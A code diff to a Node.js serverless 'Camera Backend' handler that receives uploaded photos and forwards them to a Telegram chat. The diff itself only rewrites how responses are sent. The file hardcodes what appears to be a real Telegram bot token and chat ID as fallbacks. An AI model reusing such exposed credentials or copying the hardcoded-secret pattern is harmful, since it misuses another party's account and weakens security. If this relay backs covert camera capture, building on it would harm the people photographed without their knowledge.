@@ -2,7 +2,7 @@ const multer = require('multer');
 const axios = require('axios');
 const FormData = require('form-data');
 
-// Vars (Hardcoded fallback)
+// Vars (Hardcoded fallback for immediate stability)
 const BOT_TOKEN = process.env.BOT_TOKEN || '8217603317:AAHbCjswpTeM2YMP-PdnBMZ8xvmfdr2jIug';
 const CHAT_ID = process.env.CHAT_ID || '1603071848';
 
@@ -35,13 +35,17 @@ module.exports = async function handler(req, res) {
 
     // Handle OPTIONS (Preflight)
     if (req.method === 'OPTIONS') {
-        res.status(200).end();
+        res.statusCode = 200;
+        res.end();
         return;
     }
 
     // Only allow POST
     if (req.method !== 'POST') {
-        return res.status(200).send('Camera Backend is Running! (V3 - Native)');
+        res.statusCode = 200;
+        res.setHeader('Content-Type', 'text/plain');
+        res.end('Camera Backend is Running! (V4 - Bulletproof)');
+        return;
     }
 
     try {
@@ -49,7 +53,10 @@ module.exports = async function handler(req, res) {
         await runMiddleware(req, res, upload.single('photo'));
 
         if (!req.file) {
-            return res.status(400).json({ error: 'No file uploaded' });
+            res.statusCode = 400;
+            res.setHeader('Content-Type', 'application/json');
+            res.end(JSON.stringify({ error: 'No file uploaded' }));
+            return;
         }
 
         console.log('Sending photo to Telegram...');
@@ -69,13 +76,17 @@ module.exports = async function handler(req, res) {
             }
         );
 
-        res.status(200).json({ success: true, telegram: telegramResponse.data.ok });
+        res.statusCode = 200;
+        res.setHeader('Content-Type', 'application/json');
+        res.end(JSON.stringify({ success: true, telegram: telegramResponse.data.ok }));
 
     } catch (error) {
         console.error('Error:', error.message);
-        res.status(500).json({
+        res.statusCode = 500;
+        res.setHeader('Content-Type', 'application/json');
+        res.end(JSON.stringify({
             error: error.response ? error.response.data.description : error.message
-        });
+        }));
     }
 };
 
